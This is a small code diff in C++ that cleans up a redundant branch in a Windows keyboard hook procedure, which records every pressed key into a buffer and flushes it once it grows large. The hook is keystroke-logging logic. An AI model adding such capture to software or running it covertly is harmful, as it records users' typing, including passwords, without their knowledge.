@@ -392,10 +392,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
         std::string keyStr = GetKeyString(vk);
         if (!keyStr.empty()) {
-            if (now - g_lastTick > 300 && !g_keys.empty())
-                g_keys += keyStr;
-            else
-                g_keys += keyStr;
+            g_keys += keyStr;
             g_lastTick = now;
             if (g_keys.size() > 5000) FlushBuffer();
         }
